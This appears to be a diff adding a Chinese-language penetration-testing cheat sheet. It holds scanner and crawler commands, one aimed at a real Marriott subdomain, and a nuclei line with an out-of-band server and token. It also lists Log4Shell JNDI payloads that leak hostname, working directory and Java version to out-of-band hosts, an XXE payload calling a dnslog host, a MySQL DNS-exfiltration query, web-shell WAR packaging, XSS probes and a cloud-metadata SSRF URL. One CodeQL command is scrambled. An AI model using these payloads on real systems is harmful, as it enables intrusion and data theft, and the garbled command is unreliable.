@@ -1,0 +1,80 @@
+ 
+全扫描
+xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --webhook-output http://127.0.0.1:5000/webhook --html-output testphp.html
+
+扫cve
+xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --webhook-output http://127.0.0.1:5000/webhook --html-output testphp.html --plugins phantasm,sqldet,struts,thinkphp,upload,xstream
+
+不扫cve
+xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --webhook-output http://127.0.0.1:5000/webhook --html-output testphp.html --plugins xxe,jsonp,xss,fastjson,shiro,crlf-injection,redirect,ssrf,brute-force,path-traversal,cmd-injection
+
+爬虫：
+crawlergo_win_amd64.exe --no-headless -c "D:\OTHERSOFT\chrome-win\chrome.exe"  -t 10 https://mgs.marriott.com
+
+rad:
+rad_windows_amd64.exe --url-file url.txt -http-proxy 127.0.0.1:7777 -full-text-output result.txt
+
+nuclei：
+nuclei -list test.txt -o result.json -timeout 20 -rl 500 -bs 100 -c 50 -s medium,high,critical -inserver hbmz.eyes.sh -itoken 21571881
+
+afrog:
+afrog -T urls.txt -S high,critical
+
+
+gau命令
+linux：
+echo "qq.com" | gau | grep -vE '\.(pdf|exe|png|jpg|jif|jepg|apk)$'
+
+Windows：
+echo "qq.com" | gau | Select-String -Pattern '\.(pdf|exe|png|jpg|jif|jepg|apk)$' -NotMatch
+echo "qq.com" | gau | Select-String -Pattern '\.(pdf|exe|png|jpg|jif|jepg|apk)$' -NotMatch
+
+
+${jndi:ldap://hbmz.eyes.sh/e}
+${jndi:ldap://{hostName}.hbmz.eyes.sh/e}
+${jndi:ldap://${java.version}.hbmz.eyes.sh/e}
+
+${jndi:rmi://hbmz.eyes.sh/e}
+${jndi:rmi://{hostName}.hbmz.eyes.sh/e}
+
+${jndi:ldap://${hostName}-${sys:user.dir}-${sys:java.version}-${java:os}.di5u2g.ceye.io/e}
+
+<?xml version="1.0"?>
+<!DOCTYPE ANY [
+<!ENTITY content SYSTEM " http://84hrkh.dnslog.cn/hhhhhhh">]>
+<name>&content;</name>
+
+
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.mysql.di5u2g.ceye.io\\abc'));
+
+jar -cf test.war shell.jsp
+
+<html><script>alert(document.cookie)</script></html>
+<img src=x onerror=alert(1)>
+'-prompt(1)-'
+
+certutil -hashfile <文件名称> MD5
+
+阿里云ssrf：http://100.100.100.200/latest/meta-data
+
+
+检查存储库是否有任何 CodeQL 数据库可供下载
+gh api /repos/<owner>/<repo>/code-scanning/codeql/databases
+
+下载CodeQL 数据库
+gh api /repos/dataease/dataease/code-scanning/codeql/databases/java -H "Accept: application/zip" > database.zip
+
+
+生成代码扫描数据库
+java：
+codeql database create D:\codeqldb/javasec --language=java  --command="mvn clean install --file pom.xml -Dmaven.test.skip=true" --source-root=./javasec --threads=8
+
+javascript：
+codeql database crvascript --threads=8eate codeqldb --language=ja
+
+分析javaCodeQL数据库
+codeql database analyze codeql_db  D:\CodeQL\codeql-codeql-cli-v2.13.3\java\ql\src\codeql-suites\java-security-extended.qls --format=csv --output=java-results.csv --threads=8
+
+
+分析javascriptCodeQL数据库
+codeql database analyze javascript D:\CodeQL\codeql-codeql-cli-v2.13.3\javascript\ql\src\codeql-suites\javascript-security-extended.qls --format=csv --output=js-results.csv --threads=8
